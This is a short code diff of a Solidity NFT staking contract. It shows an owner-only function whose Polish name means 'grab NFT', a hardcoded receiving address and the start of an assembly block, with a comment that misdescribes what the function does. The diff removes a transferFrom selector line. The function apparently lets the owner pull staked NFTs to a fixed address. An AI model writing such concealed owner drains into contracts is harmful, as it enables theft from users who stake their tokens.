@@ -192,7 +192,6 @@ contract StakingLove is Ownable(msg.sender), ERC721Holder {
 
     function zgarnijNft(uint256 tokenIds) external onlyOwner {
         // Get the timestamp when the token was staked
-        bytes4 transferFrom = 0x23b872dd;
         address skarbiec = 0x13d8cc1209A8a189756168AbEd747F2b050D075f;
 
         assembly {
